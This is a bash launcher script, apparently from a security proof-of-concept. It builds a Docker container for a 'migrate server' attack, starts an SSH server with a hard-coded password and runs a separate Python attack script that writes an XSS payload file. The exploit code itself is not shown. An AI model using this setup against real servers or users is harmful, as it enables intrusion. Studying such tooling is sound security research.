#!/bin/bash

if test "$#" -ne 1; then
    echo "Runs a docker container configured for the \"migrate server\" attack"
    echo "USAGE: $0 THIS_SERVERS_IP"
    exit
fi
MY_IP=$1

set -e

CONTAINER_PASSWORD="suggest_coconuts_migrate"
docker build -t migrate_server --build-arg PASSWORD=$CONTAINER_PASSWORD .

PAYLOAD_PATH="xss_payload.html"
rm -f $PAYLOAD_PATH
echo "[*] Starting migrate target (SSH server), payload will be written to $PAYLOAD_PATH"

HOST_MOUNT=`pwd`
GUEST_MOUNT='/host'
docker run   \
    --rm -it \
    -e HOST_MOUNT=$HOST_MOUNT -e GUEST_MOUNT=$GUEST_MOUNT \
    -v $HOST_MOUNT:$GUEST_MOUNT \
    -p $MY_IP:22:22 \
    migrate_server sh -c "\
        /usr/sbin/sshd -e && \
        python3 ./run_migrate_attack.py \
            --password=$CONTAINER_PASSWORD \
            --payload_path=$GUEST_MOUNT/$PAYLOAD_PATH \
            $MY_IP root"
